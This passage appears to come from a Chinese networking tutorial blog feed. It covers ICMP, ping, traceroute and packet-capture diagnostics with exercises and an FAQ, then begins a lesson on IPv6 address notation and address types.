class="hljs-literal">-</span>w file  <span class="hljs-comment"># 保存到文件</span><br><span class="hljs-literal">-</span>r file  <span class="hljs-comment"># 读取文件</span><br><span class="hljs-literal">-</span>n  <span class="hljs-comment"># 不解析</span><br><span class="hljs-literal">-</span>v  <span class="hljs-comment"># 详细输出</span><br><br>示例：<br><span class="hljs-comment"># 抓取ping包</span><br>tcpdump -i any icmp<br><br><span class="hljs-comment"># 抓取到google.com的包并保存</span><br>tcpdump -i eth0 host google.com -w capture.pcap<br><br>Wireshark：<br><span class="hljs-literal">-</span> 图形化抓包工具<br><span class="hljs-literal">-</span> 功能强大<br><span class="hljs-literal">-</span> 详细分析<br><span class="hljs-literal">-</span> 适合桌面使用<br><br>特点：<br>✅ 直观的界面<br>✅ 强大的过滤<br>✅ 协议解析<br>✅ 统计分析<br>✅ 流追踪<br></code></pre></td></tr></table></figure><hr><h2 id="6-实战项目：网络诊断工具套件"><a href="#6-实战项目：网络诊断工具套件" class="headerlink" title="6. 实战项目：网络诊断工具套件"></a>6. 实战项目：网络诊断工具套件</h2><h3 id="6-1-项目需求"><a href="#6-1-项目需求" class="headerlink" title="6.1 项目需求"></a>6.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能需求：<br><span class="hljs-bullet">1.</span> 实现ping功能<br><span class="hljs-bullet">   -</span> ICMP回显请求/应答<br><span class="hljs-bullet">   -</span> RTT计算<br><span class="hljs-bullet">   -</span> 统计信息<br><br><span class="hljs-bullet">2.</span> 实现traceroute功能<br><span class="hljs-bullet">   -</span> TTL递增<br><span class="hljs-bullet">   -</span> 路径发现<br><span class="hljs-bullet">   -</span> 延迟测量<br><br><span class="hljs-bullet">3.</span> 网络质量测试<br><span class="hljs-bullet">   -</span> 丢包率<br><span class="hljs-bullet">   -</span> 延迟抖动<br><span class="hljs-bullet">   -</span> 持续监控<br><br><span class="hljs-bullet">4.</span> 综合诊断报告<br><span class="hljs-bullet">   -</span> 连通性测试<br><span class="hljs-bullet">   -</span> 路径分析<br><span class="hljs-bullet">   -</span> 性能评估<br><br>技术要求：<br><span class="hljs-bullet">-</span> Python实现<br><span class="hljs-bullet">-</span> 使用原始套接字<br><span class="hljs-bullet">-</span> 跨平台支持（尽量）<br><span class="hljs-bullet">-</span> 友好的输出<br></code></pre></td></tr></table></figure><h3 id="6-2-工具演示"><a href="#6-2-工具演示" class="headerlink" title="6.2 工具演示"></a>6.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ping功能</span><br>python day24_network_diagnostic.py --ping google.com<br><br><span class="hljs-comment"># traceroute功能</span><br><span class="hljs-built_in">sudo</span> python day24_network_diagnostic.py --traceroute google.com<br><br><span class="hljs-comment"># 网络质量测试</span><br>python day24_network_diagnostic.py --quality google.com --count 100<br><br><span class="hljs-comment"># 综合诊断</span><br>python day24_network_diagnostic.py --diagnose google.com<br></code></pre></td></tr></table></figure><hr><h2 id="7-今日练习"><a href="#7-今日练习" class="headerlink" title="7. 今日练习"></a>7. 今日练习</h2><h3 id="练习1：ping分析"><a href="#练习1：ping分析" class="headerlink" title="练习1：ping分析"></a>练习1：ping分析</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ping一个网站100次，观察：<br><span class="hljs-bullet">   -</span> 平均RTT<br><span class="hljs-bullet">   -</span> 最大/最小RTT<br><span class="hljs-bullet">   -</span> 丢包率<br><span class="hljs-bullet">   -</span> RTT分布<br><br><span class="hljs-bullet">2.</span> ping时修改包大小：<br><span class="hljs-bullet">   -</span> 正常大小（56字节）<br><span class="hljs-bullet">   -</span> MTU大小（1472字节）<br><span class="hljs-bullet">   -</span> 超过MTU（2000字节）<br>   观察有什么不同？<br><br><span class="hljs-bullet">3.</span> ping时修改TTL：<br><span class="hljs-bullet">   -</span> TTL=1<br><span class="hljs-bullet">   -</span> TTL=5<br><span class="hljs-bullet">   -</span> TTL=64<br>   观察结果的区别<br></code></pre></td></tr></table></figure><h3 id="练习2：traceroute分析"><a href="#练习2：traceroute分析" class="headerlink" title="练习2：traceroute分析"></a>练习2：traceroute分析</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> traceroute到一个国外网站：<br><span class="hljs-bullet">   -</span> 记录总跳数<br><span class="hljs-bullet">   -</span> 找出延迟最大的一跳<br><span class="hljs-bullet">   -</span> 分析是否跨越长距离链路<br><br><span class="hljs-bullet">2.</span> 对比不同目标的路径：<br><span class="hljs-bullet">   -</span> 国内网站<br><span class="hljs-bullet">   -</span> 香港网站<br><span class="hljs-bullet">   -</span> 美国网站<br>   分析路由差异<br><br><span class="hljs-bullet">3.</span> 使用不同方法traceroute：<br><span class="hljs-bullet">   -</span> UDP方式<br><span class="hljs-bullet">   -</span> ICMP方式<br><span class="hljs-bullet">   -</span> TCP方式<br>   对比结果差异<br></code></pre></td></tr></table></figure><h3 id="练习3：实际故障诊断"><a href="#练习3：实际故障诊断" class="headerlink" title="练习3：实际故障诊断"></a>练习3：实际故障诊断</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">场景：网站访问很慢<br><br>诊断步骤：<br><span class="hljs-bullet">1.</span> ping网站<br><span class="hljs-bullet">   -</span> 能ping通吗？<br><span class="hljs-bullet">   -</span> RTT多少？<br><span class="hljs-bullet">   -</span> 有丢包吗？<br><br><span class="hljs-bullet">2.</span> traceroute<br><span class="hljs-bullet">   -</span> 哪一跳延迟高？<br><span class="hljs-bullet">   -</span> 有超时的跳吗？<br><br><span class="hljs-bullet">3.</span> nslookup<br><span class="hljs-bullet">   -</span> DNS解析正常吗？<br><span class="hljs-bullet">   -</span> 解析时间多长？<br><br><span class="hljs-bullet">4.</span> 综合分析：<br><span class="hljs-bullet">   -</span> 问题在哪？<br><span class="hljs-bullet">   -</span> 如何解决？<br></code></pre></td></tr></table></figure><h3 id="练习4：编程实现"><a href="#练习4：编程实现" class="headerlink" title="练习4：编程实现"></a>练习4：编程实现</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">实现一个简单的ping：<br><span class="hljs-bullet">1.</span> 构造ICMP回显请求<br><span class="hljs-bullet">2.</span> 发送数据包<br><span class="hljs-bullet">3.</span> 接收响应<br><span class="hljs-bullet">4.</span> 计算RTT<br><span class="hljs-bullet">5.</span> 显示结果<br><br>提示：<br><span class="hljs-bullet">-</span> 使用socket.IPPROTO<span class="hljs-emphasis">_ICMP</span><br><span class="hljs-emphasis">- 需要root权限</span><br><span class="hljs-emphasis">- 计算校验和</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-常见问题"><a href="#8-常见问题" class="headerlink" title="8. 常见问题"></a>8. 常见问题</h2><p><strong>Q1：为什么有些网站ping不通但能访问？</strong></p><p>A：</p><ul><li>服务器可能禁用了ICMP响应</li><li>防火墙过滤ICMP</li><li>这是安全配置</li><li>可以尝试TCP ping（如httping）</li></ul><p><strong>Q2：traceroute中的 * * * 是什么意思？</strong></p><p>A：</p><ul><li>该跳路由器不响应ICMP</li><li>可能被配置为不回复</li><li>或防火墙过滤</li><li>不一定表示故障</li></ul><p><strong>Q3：为什么ping的RTT有时突然变大？</strong></p><p>A：<br>可能原因：</p><ul><li>网络拥塞</li><li>路由器负载高</li><li>链路质量差</li><li>无线信号弱</li><li>后台下载&#x2F;上传</li></ul><p><strong>Q4：ping和HTTP访问的延迟为什么不同？</strong></p><p>A：</p><ul><li>ping只测ICMP往返（网络层）</li><li>HTTP包括TCP握手+应用处理（多层）</li><li>HTTP延迟 ≈ ping RTT + TCP握手 + 服务器处理</li><li>通常HTTP延迟 &gt; ping RTT</li></ul><p><strong>Q5：如何测试到特定端口的连通性？</strong></p><p>A：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用telnet</span><br>telnet google.com 80<br><br><span class="hljs-comment"># 使用nc（netcat）</span><br>nc -zv google.com 80<br><br><span class="hljs-comment"># 使用nmap</span><br>nmap -p 80 google.com<br><br><span class="hljs-comment"># TCP traceroute</span><br><span class="hljs-built_in">sudo</span> traceroute -T -p 80 google.com<br></code></pre></td></tr></table></figure><hr><h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a>9. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>ICMP协议</strong>：</p><ul><li>网络层辅助协议</li><li>错误报告和诊断</li><li>主要类型和格式</li></ul></li><li><p><strong>ping工作原理</strong>：</p><ul><li>ICMP回显请求&#x2F;应答</li><li>RTT计算</li><li>丢包检测</li></ul></li><li><p><strong>traceroute原理</strong>：</p><ul><li>利用TTL递减</li><li>路径发现</li><li>UDP&#x2F;ICMP&#x2F;TCP方式</li></ul></li><li><p><strong>ICMPv6</strong>：</p><ul><li>功能更强大</li><li>整合NDP和MLD</li><li>邻居发现协议</li></ul></li><li><p><strong>诊断工具</strong>：</p><ul><li>ping&#x2F;ping6</li><li>traceroute&#x2F;traceroute6</li><li>mtr&#x2F;pathping</li><li>netstat&#x2F;ss</li><li>tcpdump&#x2F;wireshark</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs dos">ICMP报文结构：<br>- <span class="hljs-built_in">Type</span>（类型）<br>- Code（代码）<br>- Checksum（校验和）<br>- 数据部分<br><br><span class="hljs-built_in">ping</span>流程：<br>发送ICMP <span class="hljs-built_in">Echo</span> Request (<span class="hljs-built_in">Type</span> <span class="hljs-number">8</span>)<br>→ 目标返回<span class="hljs-built_in">Echo</span> Reply (<span class="hljs-built_in">Type</span> <span class="hljs-number">0</span>)<br>→ 计算RTT<br><br>traceroute流程：<br>TTL=<span class="hljs-number">1</span> → 第<span class="hljs-number">1</span>跳返回超时<br>TTL=<span class="hljs-number">2</span> → 第<span class="hljs-number">2</span>跳返回超时<br>...<br>直到目标主机<br><br>常用工具：<br><span class="hljs-built_in">ping</span>：测试连通性<br>traceroute：追踪路径<br>mtr：实时监控<br>tcpdump：抓包分析<br></code></pre></td></tr></table></figure><h3 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 快速连通性测试：<br>   ping -c 1 -W 1 target<br><br><span class="hljs-bullet">2.</span> 持续监控网络质量：<br>   mtr target<br><br><span class="hljs-bullet">3.</span> 诊断DNS问题：<br>   nslookup / dig<br><br><span class="hljs-bullet">4.</span> 查看连接状态：<br>   ss -antp<br><br><span class="hljs-bullet">5.</span> 抓包分析：<br>   tcpdump icmp -i any<br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第25天：ARP协议和链路层</strong></p><p>内容预览：</p><ul><li>ARP协议原理</li><li>ARP缓存管理</li><li>ARP欺骗和防御</li><li>RARP和代理ARP</li><li>链路层其他协议</li><li>网络安全实践</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们深入学习了ICMP协议和各种网络诊断工具，这些是网络工程师日常工作的必备技能。理解ping和traceroute的原理，能让我们更好地诊断和解决网络问题。明天我们将学习ARP协议，了解IP地址如何映射到MAC地址！</p><p><strong>进度：24&#x2F;180天（13.3%）</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>23天：IPv6详解</title>
    <link href="/2025/11/10/23%E5%A4%A9%EF%BC%9AIPv6%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/23%E5%A4%A9%EF%BC%9AIPv6%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="第23天：IPv6详解"><a href="#第23天：IPv6详解" class="headerlink" title="第23天：IPv6详解"></a>第23天：IPv6详解</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解IPv6产生的背景和必要性</li><li>掌握IPv6地址格式和表示方法</li><li>学习IPv6特性和优势</li><li>了解IPv6报文格式</li><li>理解IPv6地址类型</li><li>学习IPv6过渡技术</li><li>实现IPv6地址解析工具</li></ul><hr><h2 id="1-IPv6概述"><a href="#1-IPv6概述" class="headerlink" title="1. IPv6概述"></a>1. IPv6概述</h2><h3 id="1-1-为什么需要IPv6？"><a href="#1-1-为什么需要IPv6？" class="headerlink" title="1.1 为什么需要IPv6？"></a>1.1 为什么需要IPv6？</h3><p><strong>IPv4地址耗尽</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv4地址空间：<br><span class="hljs-bullet">- </span>32位地址<br><span class="hljs-bullet">- </span>总数：2^32 = 4,294,967,296 ≈ 43亿个<br><span class="hljs-bullet">- </span>实际可用：更少（保留地址、私有地址等）<br><br>全球需求：<br><span class="hljs-bullet">- </span>全球人口：约80亿<br><span class="hljs-bullet">- </span>每人多设备：手机、电脑、平板、手表...<br><span class="hljs-bullet">- </span>物联网设备：数百亿<br><span class="hljs-bullet">- </span>明显不够用！<br><br>地址耗尽时间线：<br><span class="hljs-bullet">- </span>2011年：IANA分配完最后的IPv4地址块<br><span class="hljs-bullet">- </span>2012-2019：各地区陆续耗尽<br><span class="hljs-bullet">- </span>现状：依赖NAT等技术缓解<br></code></pre></td></tr></table></figure><p><strong>NAT的局限性</strong>：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs smali">NAT虽然缓解了地址短缺，但带来问题：<br><br>❌ 破坏端到端连接性<br>❌ 增加复杂度和延迟<br>❌ P2P应用困难<br>❌ 需要维护状态表<br>❌ 违反分层原则<br>❌ 某些协议不支持<br><br>IPv6是根本解决方案<br></code></pre></td></tr></table></figure><h3 id="1-2-IPv6的优势"><a href="#1-2-IPv6的优势" class="headerlink" title="1.2 IPv6的优势"></a>1.2 IPv6的优势</h3><p><strong>核心优势</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 巨大的地址空间<br>   ✅ 128位地址<br>   ✅ 2^128 ≈ 340万亿亿亿亿个<br>   ✅ 足够用几百年<br><br><span class="hljs-bullet">2.</span> 简化的报文头部<br>   ✅ 固定40字节（IPv4为20-60字节）<br>   ✅ 提高路由效率<br>   ✅ 扩展头部机制<br><br><span class="hljs-bullet">3.</span> 更好的移动性<br>   ✅ 移动IPv6<br>   ✅ 无需NAT<br>   ✅ 更快的切换<br><br><span class="hljs-bullet">4.</span> 内置安全性<br>   ✅ IPSec是强制的<br>   ✅ 端到端加密<br><br><span class="hljs-bullet">5.</span> 更好的QoS支持<br>   ✅ 流标签<br>   ✅ 优先级<br><br><span class="hljs-bullet">6.</span> 无需NAT<br>   ✅ 端到端连接<br>   ✅ 简化网络<br>   ✅ 更好的性能<br><br><span class="hljs-bullet">7.</span> 自动配置<br>   ✅ 无状态地址自动配置（SLAAC）<br>   ✅ 即插即用<br>   ✅ 简化管理<br><br><span class="hljs-bullet">8.</span> 更好的多播<br>   ✅ 改进的多播路由<br>   ✅ 任播支持<br></code></pre></td></tr></table></figure><hr><h2 id="2-IPv6地址格式"><a href="#2-IPv6地址格式" class="headerlink" title="2. IPv6地址格式"></a>2. IPv6地址格式</h2><h3 id="2-1-地址表示"><a href="#2-1-地址表示" class="headerlink" title="2.1 地址表示"></a>2.1 地址表示</h3><p><strong>基本格式</strong>：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ldif">IPv6地址：128位 = 16字节<br><br>表示方法：<br><span class="hljs-literal">-</span> 8个16位字段<br><span class="hljs-literal">-</span> 每个字段用4个十六进制数表示<br><span class="hljs-literal">-</span> 用冒号分隔<br><br>完整格式：<br><span class="hljs-attribute">2001</span>:0db8:0000:0000:0000:ff00:0042:8329<br><br>说明：<br>2001 : 0db8 : 0000 : 0000 : 0000 : ff00 : 0042 : 8329<br>  ↓      ↓      ↓      ↓      ↓      ↓      ↓      ↓<br> 16位   16位   16位   16位   16位   16位   16位   16位<br></code></pre></td></tr></table></figure><p><strong>地址压缩规则</strong>：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs elixir">规则<span class="hljs-number">1</span>：前导零压缩<br>可以省略每个字段的前导零<br><br>示例：<br><span class="hljs-number">2001</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">db8:</span><span class="hljs-number">0000</span><span class="hljs-symbol">:</span><span class="hljs-number">0000</span><span class="hljs-symbol">:</span><span class="hljs-number">0000</span><span class="hljs-symbol">:ff00</span><span class="hljs-symbol">:</span><span class="hljs-number">0042</span><span class="hljs-symbol">:</span><span class="hljs-number">8329</span><br>↓<br><span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:ff00</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">8329</span><br><br>规则<span class="hljs-number">2</span>：零压缩<br>连续的零字段可以用 :: 表示<br>但一个地址中只能使用一次 ::<br><br>示例：<br><span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:ff00</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">8329</span><br>↓<br><span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span>::<span class="hljs-symbol">ff00:</span><span class="hljs-number">42</span><span class="hljs-symbol">:</span><span class="hljs-number">8329</span><br><br>错误示例：<br><span class="hljs-number">2001</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><br>不能写成：<span class="hljs-number">2001</span>::<span class="hljs-number">0</span>::<span class="hljs-number">1</span>  ❌（两个::）<br>应该写成：<span class="hljs-number">2001</span>::<span class="hljs-number">1</span>     ✅<br></code></pre></td></tr></table></figure><p><strong>特殊地址表示</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">未指定地址：<br>0:0:0:0:0:0:0:0<br><span class="hljs-bullet">或 ::</span><br><span class="hljs-bullet"></span><br><span class="hljs-bullet"></span>环回地址：<br>0:0:0:0:0:0:0:1<br>或 ::1<br><br>IPv4映射地址：<br><span class="hljs-meta">::ffff:192.168.1.1</span><br>前96位为0，后32位为IPv4地址<br></code></pre></td></tr></table></figure><h3 id="2-2-IPv6地址结构"><a href="#2-2-IPv6地址结构" class="headerlink" title="2.2 IPv6地址结构"></a>2.2 IPv6地址结构</h3><p><strong>地址组成</strong>：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">IPv6地址 = 前缀 + 接口标识符<br><br>常见结构（64位前缀）：<br>┌─────────────────────────┬─────────────────────────┐<br>│    前缀（64位）          │   接口标识符（64位）     │<br>│   网络部分               │    主机部分             │<br>└─────────────────────────┴─────────────────────────┘<br><br>前缀分配：<br>┌──────┬──────────┬────────────┬─────────────────────┐<br>│ <span class="hljs-string">/48</span>  │   <span class="hljs-string">/56</span>    │    <span class="hljs-string">/64</span>     │      接口ID         │<br>│ 站点 │  子网    │  链路      │     主机            │<br>└──────┴──────────┴────────────┴─────────────────────┘<br></code></pre></td></tr></table></figure><p><strong>前缀表示</strong>：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">IPv6前缀表示：<br>地址/前缀长度<br><br>示例：<br>2001<span class="hljs-function">:db8</span>::<span class="hljs-string">/32</span><br>- 网络地址：2001<span class="hljs-function">:db8</span>::<br>- 前缀长度：32位<br><br>常见前缀长度：<br><span class="hljs-string">/32</span> - ISP分配<br><span class="hljs-string">/48</span> - 组织/站点<br><span class="hljs-string">/56</span> - 小型组织<br><span class="hljs-string">/64</span> - 单个链路（最常用）<br><span class="hljs-string">/128</span> - 单个主机<br></code></pre></td></tr></table></figure><h3 id="2-3-IPv6地址类型"><a href="#2-3-IPv6地址类型" class="headerlink" title="2.3 IPv6地址类型"></a>2.3 IPv6地址类型</h3><p><strong>单播地址（Unicast）</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown">单播 = 一对一通信<br><br>类型：<br><br><span class="hljs-bullet">1.</span> 全局单播地址（Global Unicast Address）<br><span class="hljs-bullet">   -</span> 前缀：2000::/3（2开头或3开头）<br><span class="hljs-bullet">   -</span> 相当于IPv4的公网地址<br><span class="hljs-bullet">   -</span> 全球唯一，可路由<br><span class="hljs-bullet">   -</span> 示例：2001:db8::1<br><br><span class="hljs-bullet">2.</span> 链路本地地址（Link-Local Address）<br><span class="hljs-bullet">   -</span> 前缀：fe80::/10<br><span class="hljs-bullet">   -</span> 只在本地链路有效<br><span class="hljs-bullet">   -</span> 不能路由<br><span class="hljs-bullet">   -</span> 自动配置<br><span class="hljs-bullet">   -</span> 相当于IPv4的169.254.0.0/16<br><span class="hljs-bullet">   -</span> 示例：fe80::1<br><br><span class="hljs-bullet">3.</span> 唯一本地地址（Unique Local Address，ULA）<br><span class="hljs-bullet">   -</span> 前缀：fc00::/7（实际使用fd00::/8）<br><span class="hljs-bullet">   -</span> 相当于IPv4的私有地址<br><span class="hljs-bullet">   -</span> 本地路由，不在互联网路由<br><span class="hljs-bullet">   -</span> 示例：fd12:3456:789a::1<br><br><span class="hljs-bullet">4.</span> 环回地址（Loopback）<br><span class="hljs-bullet">   -</span> 地址：::1<br><span class="hljs-bullet">   -</span> 